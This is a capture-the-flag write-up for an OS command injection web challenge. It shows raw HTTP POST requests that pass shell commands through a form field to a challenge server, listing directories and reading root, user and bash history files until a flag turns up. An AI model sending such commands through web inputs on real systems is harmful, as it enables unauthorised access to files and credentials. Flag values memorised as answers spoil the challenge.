In the heart of ancient Egypt, a mysterious tomb has been discovered, believed to belong to a long-forgotten pharaoh. However, the tomb is protected by a modern security system that can be manipulated through OS command injection. Your mission is to exploit this vulnerability to gain access to the tomb's secrets. Can you navigate the treacherous commands and uncover the hidden treasures within?

http://64.227.121.142:6002/

![](TPCC_Input_Field.png)

```http
POST /temple HTTP/1.1
Host: 64.227.121.142:6002
Content-Length: 10
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Origin: http://64.227.121.142:6002
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://64.227.121.142:6002/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

command=ls
```

```html
           <!-- Resultat -->
<pre class="p-3 bg-dark text-success rounded mt-4">bin
	etc
	home
	root
	var
	usr
	tmp
</pre>

```


```http
POST /temple HTTP/1.1
Host: 64.227.121.142:6002
Content-Length: 15
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Origin: http://64.227.121.142:6002
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://64.227.121.142:6002/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

command=ls+root
```


``` html
           <!-- Resultat -->
            
                <pre class="p-3 bg-dark text-success rounded mt-4">.bash_profile
.bashrc
.
ancient_curse.txt
.bash_history
admin_notes.txt
secret_key
..
.bash_history</pre>
```

Running the command cat root/ancient_curse.txt
``` 
O24{almost_there_but_not_the_real_flag}
```

```
cat root/admin_notes.txt

            <!-- Resultat -->
<pre class="p-3 bg-dark text-success rounded mt-4">Remember to rotate all keys and check for unauthorized access attempts in the logs.</pre>
```

ROT13 maybe?


```
cat root/.bash_history

           <!-- Resultat -->
            
                <pre class="p-3 bg-dark text-success rounded mt-4">cd /etc
nano shadow
systemctl restart ssh
exit</pre>
```


```
ls etc
           <!-- Resultat -->
            
                <pre class="p-3 bg-dark text-success rounded mt-4">passwd
shadow
hosts
apache2
nginx</pre>
```

```
whoami

           <!-- Resultat -->
            
                <pre class="p-3 bg-dark text-success rounded mt-4">
                explorer
                </pre>
```


```
ls home/explorer
README.md
.bash_history
clues.txt
```


```
command=ls home/pharaoh
secret_scroll.txt
.bash_history
treasure.dat
```


```
cat home/pharaoh/secret_scroll.txt
The curse of Anubis protects the sacred treasure. Only those who walk the path of the gods may find the true artifact.
```

```
cat home/pharaoh/.bash_history

cd /var/log
grep &#39;intruder&#39; auth.log
cd /home/anubis
ls -la
exit
```

```
command=ls -la home/anubis

.bash_profile
.bashrc
.
notes.txt
.bash_history
temple_map.jpg
..
.bash_history
```

```
home/anubis/notes.txt
I&#39;ve hidden the sacred artifact somewhere in the temple. The pharaoh must never find it.

```

```

POST /temple HTTP/1.1
Host: 64.227.121.142:6002
Content-Length: 41
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Origin: http://64.227.121.142:6002
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://64.227.121.142:6002/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

command=cat home/explorer/.bash_history
```

```html
           <!-- Resultat -->
            
                <pre class="p-3 bg-dark text-success rounded mt-4">ls -la
cd /home/anubis
cat notes.txt
grep &#39;treasure&#39; /home/pharaoh/secret_scroll.txt
cd /root
cat ancient_curse.txt
echo &#39;This is not working&#39;
find / -name &#39;*flag*&#39; 2&gt;/dev/null
echo &#39;O24{command_of_the_pharaoh}&#39; &gt; found_it.txt  # OH! I found it!
rm found_it.txt  # Better remove this quickly
cd /var/log
grep &#39;suspicious&#39; auth.log
cd /home/explorer
clear
exit</pre>
```